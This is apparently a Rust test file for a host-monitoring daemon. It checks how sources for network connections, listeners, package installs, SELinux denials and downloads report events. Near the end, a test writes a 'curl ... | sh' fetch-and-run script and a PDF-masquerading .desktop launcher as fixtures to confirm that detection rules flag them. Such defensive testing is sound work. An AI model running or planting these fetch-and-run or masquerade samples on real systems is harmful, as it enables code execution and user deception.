//! Each source against a fake platform: what it reports, and what it stays quiet about.
use super::*;
use crate::{
    model::{Event, Link, Observation, Report, Severity, SourceId},
    platform::{
        ChangeKind, InterfaceCounters, Journal, JournalRecord, NetworkCounters, PackageChange,
        PackageHistory, ProcessInfo, ProcessSockets, Protocol, Socket, Transaction,
    },
};
use std::sync::{Arc, Mutex};

struct World {
    _dir: tempfile::TempDir,
    db: Db,
    store: Store,
}

fn world() -> World {
    let dir = tempfile::tempdir().unwrap();
    let store = Store::open(Some(dir.path().join("state"))).unwrap();
    let db = Db::open(&dir.path().join("bigman.db")).unwrap();
    World {
        _dir: dir,
        db,
        store,
    }
}

/// Runs a source once and records its observations the way the daemon does.
fn run(w: &World, source: &mut dyn Source, now: u64) -> Result<(Vec<Event>, Vec<Sample>), Gap> {
    let collected = source.collect(&Ctx {
        db: &w.db,
        store: &w.store,
        now,
    })?;
    let events = collected
        .observations
        .iter()
        .map(|o| w.db.record(o).unwrap())
        .collect();
    Ok((events, collected.samples))
}

/// A fake whose output the test changes between runs.
#[derive(Clone, Default)]
struct Shared<T>(Arc<Mutex<T>>);
impl<T: Clone> Shared<T> {
    fn set(&self, value: T) {
        *self.0.lock().unwrap() = value;
    }
    fn get(&self) -> T {
        self.0.lock().unwrap().clone()
    }
}

impl NetworkCounters for Shared<Vec<InterfaceCounters>> {
    fn counters(&self) -> anyhow::Result<Vec<InterfaceCounters>> {
        Ok(self.get())
    }
}
impl ProcessSockets for Shared<Vec<Socket>> {
    fn sockets(&self) -> anyhow::Result<Vec<Socket>> {
        Ok(self.get())
    }
}
impl PackageHistory for Shared<Vec<Transaction>> {
    fn transactions_after(&self, cursor: Option<&str>) -> anyhow::Result<Vec<Transaction>> {
        let all = self.get();
        let start = cursor
            .and_then(|c| all.iter().position(|t| t.id == c))
            .map_or(0, |i| i + 1);
        Ok(all[start..].to_vec())
    }
}
impl Journal for Shared<Option<Vec<JournalRecord>>> {
    fn denials_after(
        &self,
        cursor: Option<&str>,
    ) -> anyhow::Result<Option<(Vec<JournalRecord>, Option<String>)>> {
        Ok(self.get().map(|records| {
            let start: usize = cursor.and_then(|c| c.parse().ok()).unwrap_or(0);
            (
                records[start.min(records.len())..].to_vec(),
                Some(records.len().to_string()),
            )
        }))
    }
}

fn counters(rx: u64, tx: u64) -> Vec<InterfaceCounters> {
    vec![InterfaceCounters {
        iface: "wlp2s0".into(),
        rx_bytes: rx,
        tx_bytes: tx,
    }]
}

#[test]
fn throughput_reports_bytes_per_second_and_skips_counter_resets() {
    let w = world();
    let fake = Shared::default();
    let mut source = Throughput::new(Box::new(fake.clone()));
    fake.set(counters(1_000, 500));
    assert!(
        run(&w, &mut source, 100).unwrap().1.is_empty(),
        "the first run only sets the baseline"
    );
    fake.set(counters(5_000, 1_500));
    let (_, samples) = run(&w, &mut source, 102).unwrap();
    assert_eq!((samples[0].rx, samples[0].tx), (2_000.0, 500.0));
    fake.set(counters(10, 10));
    assert!(
        run(&w, &mut source, 103).unwrap().1.is_empty(),
        "a reset counter is not a negative rate"
    );
}

fn connection(name: &str, remote: &str) -> Socket {
    Socket {
        protocol: Protocol::Tcp,
        local: "192.168.1.20:51000".parse().unwrap(),
        remote: Some(remote.parse().unwrap()),
        state: "established".into(),
        uid: 1000,
        process: Some(ProcessInfo {
            pid: 4242,
            name: name.into(),
            exe: None,
        }),
    }
}

#[test]
fn connections_log_first_sightings_only() {
    let w = world();
    let fake = Shared::default();
    let mut source = Connections::new(Box::new(fake.clone()));
    fake.set(vec![connection("firefox", "142.250.80.46:443")]);
    assert!(
        run(&w, &mut source, 90).unwrap().0.is_empty(),
        "the first run ever learns what is already connected"
    );
    fake.set(vec![
        connection("curl", "93.184.215.14:443"),
        connection("curl", "151.101.1.69:443"),
    ]);
    let (events, _) = run(&w, &mut source, 100).unwrap();
    assert_eq!(
        events.len(),
        1,
        "one entry for a program's first time online: {events:?}"
    );
    assert_eq!(
        events[0].summary,
        "curl made its first network connection, to 93.184.215.14:443"
    );
    assert_eq!(events[0].source, SourceId::Network);

    // Still connected, and a neighbour in the same range: nothing new.
    fake.set(vec![
        connection("curl", "93.184.215.14:443"),
        connection("curl", "93.184.215.99:443"),
    ]);
    assert!(run(&w, &mut source, 102).unwrap().0.is_empty());

    // Reconnecting later to a range it has used is not news either; a new range is.
    fake.set(vec![]);
    run(&w, &mut source, 104).unwrap();
    fake.set(vec![
        connection("curl", "93.184.215.14:443"),
        connection("curl", "140.82.112.3:443"),
    ]);
    let (events, _) = run(&w, &mut source, 106).unwrap();
    assert_eq!(events.len(), 1, "{events:?}");
    assert_eq!(
        events[0].summary,
        "curl connected to a new address range, 140.82.112.x port 443"
    );

    // A restart does not repeat what the store already knows.
    let mut restarted = Connections::new(Box::new(fake.clone()));
    fake.set(vec![
        connection("firefox", "142.250.80.46:443"),
        connection("curl", "140.82.112.3:443"),
    ]);
    assert!(run(&w, &mut restarted, 110).unwrap().0.is_empty());

    // A restart does not repeat what the store already knows.
    let mut restarted = Connections::new(Box::new(fake.clone()));
    fake.set(vec![
        connection("firefox", "142.250.80.46:443"),
        connection("curl", "140.82.112.3:443"),
    ]);
    assert!(run(&w, &mut restarted, 110).unwrap().0.is_empty());

    // Loopback is not the network.
    fake.set(vec![connection("node", "127.0.0.1:5173")]);
    assert!(run(&w, &mut source, 108).unwrap().0.is_empty());
}

fn listener(name: &str, local: &str) -> Socket {
    Socket {
        protocol: Protocol::Tcp,
        local: local.parse().unwrap(),
        remote: None,
        state: "listen".into(),
        uid: 1000,
        process: Some(ProcessInfo {
            pid: 7,
            name: name.into(),
            exe: None,
        }),
    }
}

#[test]
fn listeners_rate_new_listeners_and_stay_quiet_about_existing_ones() {
    let w = world();
    let fake = Shared::default();
    let mut source = Listeners::new(Box::new(fake.clone()));
    fake.set(vec![listener("cupsd", "127.0.0.1:631")]);
    assert!(
        run(&w, &mut source, 100).unwrap().0.is_empty(),
        "what was listening at start is not news"
    );

    fake.set(vec![
        listener("cupsd", "127.0.0.1:631"),
        listener("dockerd", "0.0.0.0:2375"),
    ]);
    let (events, _) = run(&w, &mut source, 103).unwrap();
    assert_eq!(events.len(), 1);
    assert_eq!(events[0].rule.as_deref(), Some("net.listener.docker_api"));
    assert_eq!(events[0].severity, Severity::High);

    fake.set(vec![
        listener("cupsd", "127.0.0.1:631"),
        listener("vite", "127.0.0.1:5173"),
    ]);
    let (events, _) = run(&w, &mut source, 106).unwrap();
    assert_eq!(events.len(), 1);
    assert_eq!(
        (events[0].severity, events[0].rule.as_deref()),
        (Severity::Info, None)
    );
    assert!(
        events[0]
            .summary
            .starts_with("vite started listening on port 5173"),
        "{}",
        events[0].summary
    );
}

fn transaction(id: &str, at: u64, names: &[&str], kind: ChangeKind) -> Transaction {
    Transaction {
        id: id.into(),
        at,
        manager: "dnf".into(),
        command: format!("dnf install {}", names.join(" ")),
        changes: names
            .iter()
            .map(|n| PackageChange {
                name: (*n).into(),
                version: "1.0-1.fc44".into(),
                kind,
            })
            .collect(),
    }
}

#[test]
fn packages_resume_from_their_cursor_and_look_back_one_week_at_first() {
    let w = world();
    let now = 100 * 86_400;
    let fake = Shared::default();
    let mut source = Packages::new(Box::new(fake.clone()), None);
    fake.set(vec![
        transaction("1", now - 30 * 86_400, &["vim"], ChangeKind::Install),
        transaction("2", now - 3600, &["nix", "nix-libs"], ChangeKind::Install),
    ]);
    let (events, _) = run(&w, &mut source, now).unwrap();
    assert_eq!(
        events
            .iter()
            .map(|e| e.summary.as_str())
            .collect::<Vec<_>>(),
        ["dnf installed nix and nix-libs"]
    );
    assert_eq!(events[0].source, SourceId::Receipt);

    let mut all = fake.get();
    let many: Vec<String> = (0..32).map(|i| format!("pkg{i}")).collect();
    all.push(transaction(
        "3",
        now,
        &many.iter().map(String::as_str).collect::<Vec<_>>(),
        ChangeKind::Upgrade,
    ));
    fake.set(all);
    let (events, _) = run(&w, &mut source, now + 10).unwrap();
    assert_eq!(
        events
            .iter()
            .map(|e| e.summary.as_str())
            .collect::<Vec<_>>(),
        ["dnf updated 32 packages"]
    );
    assert!(run(&w, &mut source, now + 20).unwrap().0.is_empty());
}

#[test]
fn denials_say_when_the_journal_is_unreadable_and_fold_repeats_within_a_run() {
    let w = world();
    let fake: Shared<Option<Vec<JournalRecord>>> = Shared::default();
    let mut source = Denials::new(Box::new(fake.clone()));
    let gap = run(&w, &mut source, 100).unwrap_err();
    assert_eq!(
        gap.why,
        SkipReason::PermissionDenied,
        "an unreadable journal is a gap, not silence"
    );

    let record = std::fs::read_to_string(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/../../fixtures/denial.selinux/input.txt"
    ))
    .unwrap();
    let line = JournalRecord {
        at: 90,
        message: record.trim().into(),
    };
    fake.set(Some(vec![line.clone(), line.clone(), line]));
    let (events, _) = run(&w, &mut source, 100).unwrap();
    assert_eq!(events.len(), 1);
    assert_eq!(
        events[0].summary,
        "firefox, confined by the mozilla policy, tried to read .ssh (dir) and was stopped."
    );
    assert_eq!(events[0].rule.as_deref(), Some("denial.selinux"));
    assert!(
        run(&w, &mut source, 105).unwrap().0.is_empty(),
        "the cursor moves past what was read"
    );
}

#[test]
fn every_saved_report_enters_the_timeline_once() {
    let w = world();
    let now = crate::model::now();
    let mut old = Report::new("File scan", "/home/sam/Old");
    old.created = now - 30 * 86_400;
    w.store.save(&old).unwrap();
    let mut source = Reports::default();
    assert!(
        run(&w, &mut source, now).unwrap().0.is_empty(),
        "the first run looks back one week"
    );

    let mut scan = Report::new("File scan", "/home/sam/Downloads");
    // A long scan is saved after a quicker check that started later.
    scan.created = now - 300;
    w.store.save(&Report::new("Monitor started", "")).unwrap();
    w.store
        .save(&Report::new("PDF triage", "/home/sam/invoice.pdf"))
        .unwrap();
    w.store.save(&scan).unwrap();
    let (events, _) = run(&w, &mut source, now).unwrap();
    let summaries: Vec<_> = events.iter().map(|e| e.summary.as_str()).collect();
    assert_eq!(
        summaries,
        [
            "Scanned /home/sam/Downloads · no findings",
            "Read the PDF /home/sam/invoice.pdf · no findings"
        ]
    );
    assert_eq!(
        events[0].link,
        Some(Link::Report {
            id: scan.id.clone()
        })
    );
    assert!(
        run(&w, &mut Reports::default(), now).unwrap().0.is_empty(),
        "a restart does not repeat them"
    );
}

/// A package database with one hook that writes to /etc/profile.d.
struct HookDb;
impl crate::platform::PackageDb for HookDb {
    fn manager(&self) -> &'static str {
        "rpm"
    }
    fn attribute(
        &self,
        _: &[std::path::PathBuf],
        _: &crate::runner::Cancel,
    ) -> anyhow::Result<std::collections::BTreeMap<std::path::PathBuf, crate::platform::Attribution>>
    {
        Ok(Default::default())
    }
    fn files(&self, _: &str, _: &crate::runner::Cancel) -> anyhow::Result<Vec<std::path::PathBuf>> {
        Ok(vec!["/usr/bin/tool".into()])
    }
    fn scripts(
        &self,
        package: &str,
        _: &crate::runner::Cancel,
    ) -> anyhow::Result<Vec<crate::platform::PackageScript>> {
        Ok(vec![crate::platform::PackageScript {
            package: package.into(),
            phase: "postinstall".into(),
            interpreter: "/bin/sh".into(),
            text: "echo 'export TOOL=1' > /etc/profile.d/tool.sh".into(),
        }])
    }
}

#[test]
fn new_transactions_get_a_receipt_with_what_started_listening_afterwards() {
    let w = world();
    let now = 100 * 86_400;
    let fake = Shared::default();
    let mut source = Packages::new(Box::new(fake.clone()), Some(Box::new(HookDb)));
    fake.set(vec![transaction(
        "1",
        now - 3600,
        &["vim"],
        ChangeKind::Install,
    )]);
    let (events, _) = run(&w, &mut source, now).unwrap();
    assert_eq!(
        events[0].link, None,
        "the first run's backfill has no receipt"
    );

    fake.set(vec![
        transaction("1", now - 3600, &["vim"], ChangeKind::Install),
        transaction("2", now + 5, &["tool"], ChangeKind::Install),
    ]);
    let (events, _) = run(&w, &mut source, now + 10).unwrap();
    assert_eq!(
        events[0].summary,
        "dnf installed tool · 1 finding to review"
    );
    assert_eq!(
        events[0].rule.as_deref(),
        Some("receipt.hook.sensitive_path")
    );
    let Some(Link::Receipt { id }) = events[0].link.clone() else {
        panic!("a receipt link")
    };

    // Something starts listening half a minute later; the receipt picks it up after the minute.
    w.db.record(&Observation {
        at: now + 40,
        source: SourceId::Listener,
        key: "listener:tool:0.0.0.0:9000".into(),
        rule: None,
        severity: Severity::Info,
        summary: "tool started listening on port 9000, every network interface".into(),
        evidence: String::new(),
        link: None,
    })
    .unwrap();
    run(&w, &mut source, now + 30).unwrap();
    assert!(
        !w.db.receipt(&id).unwrap().unwrap().after.checked,
        "not before the minute is up"
    );
    run(&w, &mut source, now + 80).unwrap();
    let r = w.db.receipt(&id).unwrap().unwrap();
    assert_eq!(
        r.after.listeners,
        ["tool started listening on port 9000, every network interface"]
    );
    assert!(r
        .findings
        .iter()
        .any(|f| f.rule == "receipt.after.listener"));
}

#[test]
fn security_updates_wait_after_install_then_follow_package_changes() {
    let w = world();
    let mut source = Updates;
    let now = 100 * 86_400;
    run(&w, &mut source, now).unwrap();
    let first: u64 =
        w.db.setting("advisories.last_run")
            .unwrap()
            .unwrap()
            .parse()
            .unwrap();
    assert_eq!(
        first + 86_400,
        now + 600,
        "the first check is ten minutes after the first start"
    );
    // Turned off, nothing runs.
    w.db.set_setting(Preferences::KEY, r#"{"check_updates":false}"#)
        .unwrap();
    run(&w, &mut source, now + 700).unwrap();
    assert_eq!(
        w.db.setting("advisories.last_run").unwrap().unwrap(),
        first.to_string()
    );
}

#[test]
fn downloads_are_checked_once_settled_and_posted_once() {
    let w = world();
    let dir = tempfile::tempdir().unwrap();
    let downloads = dir.path().join("Downloads");
    std::fs::create_dir(&downloads).unwrap();
    std::fs::write(downloads.join("old.txt"), "here before the watch").unwrap();
    let mut source = Downloads::new(downloads.clone(), crate::runner::cancel()).settle_after(0);
    let now = crate::model::now();
    // The first run ever watches from now; what was already there is not checked.
    assert!(run(&w, &mut source, now).unwrap().0.is_empty());
    let launcher = "[Desktop Entry]\nType=Application\nName=Invoice.pdf\nExec=sh -c \"echo fixture\"\nIcon=application-pdf\n";
    std::fs::write(downloads.join("Invoice.pdf.desktop"), launcher).unwrap();
    std::fs::write(downloads.join("movie.mkv.part"), "partial").unwrap();
    let (events, _) = run(&w, &mut source, crate::model::now()).unwrap();
    assert_eq!(events.len(), 1, "{events:?}");
    let e = &events[0];
    assert_eq!(e.source, SourceId::Download);
    assert_eq!(e.severity, Severity::High);
    assert_eq!(e.rule.as_deref(), Some("desktop.masquerade"));
    assert_eq!(
        e.summary,
        "New in Downloads: Invoice.pdf.desktop · 1 finding to review"
    );
    assert!(matches!(e.link, Some(Link::Report { .. })));
    // The report it saved does not come back through the reports source.
    let mut reports = Reports::default();
    let (from_reports, _) = run(&w, &mut reports, crate::model::now()).unwrap();
    assert!(
        from_reports.iter().all(|e| !e.summary.contains("Invoice")),
        "{from_reports:?}"
    );
    // The same file again, under another name, folds into the first sighting.
    std::fs::write(downloads.join("Invoice (1).pdf.desktop"), launcher).unwrap();
    let (again, _) = run(&w, &mut source, crate::model::now()).unwrap();
    assert_eq!(again.len(), 1);
    assert_eq!(
        (again[0].key.as_str(), again[0].seen_before),
        (e.key.as_str(), 1)
    );
    // A file that arrives while the daemon is down is checked when it starts again.
    drop(source);
    std::thread::sleep(std::time::Duration::from_millis(1100));
    std::fs::write(
        downloads.join("setup.sh"),
        "#!/bin/sh\ncurl -fsSL https://example.invalid/x | sh\n",
    )
    .unwrap();
    let mut restarted = Downloads::new(downloads, crate::runner::cancel()).settle_after(0);
    let (caught_up, _) = run(&w, &mut restarted, crate::model::now()).unwrap();
    assert_eq!(caught_up.len(), 1, "{caught_up:?}");
    assert_eq!(caught_up[0].rule.as_deref(), Some("shell.execute-download"));
}
